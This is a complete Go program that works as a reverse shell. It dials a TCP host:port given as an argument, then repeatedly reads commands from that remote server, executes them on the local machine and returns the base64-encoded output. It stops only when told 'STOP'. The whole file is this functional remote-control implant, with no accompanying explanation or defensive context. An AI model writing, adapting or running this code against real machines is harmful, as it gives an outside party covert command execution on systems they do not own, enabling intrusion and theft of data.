package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {
	arguments := os.Args
	if len(arguments) == 1 {
		fmt.Println("Please provide host:port.")
		return
	}

	CONNECT := arguments[1]
	c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}

	for {
		netData, err := bufio.NewReader(c).ReadString('\n')
		if err != nil {
			fmt.Println(err)
			return
		}
		if strings.TrimSpace(string(netData)) == "STOP" {
			fmt.Println("Disconnecting from server!")
			return
		}

		fmt.Print("-> ", string(netData))
		// Run command and store output
		command := strings.Replace(netData, "\n", "", -1)
		command_array := strings.Fields(command)
		fmt.Println("Running command: " + string(command))
		out, err := exec.Command(command_array[0], command_array[1:]...).Output()
		if err != nil {
			log.SetFlags(0)
			log.Printf("Error running command: %s", err)
			// log.Print(err)
		}

		// Base64 encoding command output and sending to server
		sEnc := b64.StdEncoding.EncodeToString([]byte(out))
		c.Write([]byte(sEnc + "\n"))
	}
}
